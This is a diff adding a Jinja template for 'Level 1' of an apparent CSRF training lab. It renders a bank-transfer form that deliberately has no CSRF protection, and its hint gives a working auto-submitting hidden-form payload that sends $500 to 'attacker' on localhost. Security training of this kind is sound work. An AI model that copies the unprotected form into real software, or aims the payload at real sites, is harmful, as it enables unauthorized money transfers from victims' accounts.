@@ -1,0 +1,21 @@
+{% extends "base.html" %}
+{% block content %}
+<div class="lab-header"><a href="/csrf" class="back-link">← Back to CSRF Lab</a><h1>Level 1: Bank Transfer (No CSRF Protection)</h1>
+<p class="muted">You're logged in as Alice. This form transfers money. There's no CSRF protection.</p>
+<p class="muted"><strong>Goal:</strong> Create a page on the attacker site (port 5001) that auto-transfers $500 to "attacker" when Alice visits it.</p></div>
+<div class="card" style="max-width:400px">
+  <h3>Transfer Money</h3>
+  {% if msg %}<div class="success-box">{{ msg }}</div>{% endif %}
+  <form method="POST" action="/csrf/bank" style="margin-top:12px">
+    <div class="form-group"><label>To</label><input type="text" name="to" placeholder="Recipient"></div>
+    <div class="form-group"><label>Amount ($)</label><input type="text" name="amount" placeholder="Amount"></div>
+    <button type="submit" class="btn" style="width:100%">Transfer</button>
+  </form>
+</div>
+<details class="hint-box"><summary>Hint</summary><p>Create an HTML page with a hidden form that auto-submits:<br>
+<code>&lt;form action="http://localhost:5000/csrf/bank" method="POST"&gt;<br>
+&lt;input type="hidden" name="to" value="attacker"&gt;<br>
+&lt;input type="hidden" name="amount" value="500"&gt;<br>
+&lt;/form&gt;<br>
+&lt;script&gt;document.forms[0].submit()&lt;/script&gt;</code></p></details>
+{% endblock %}
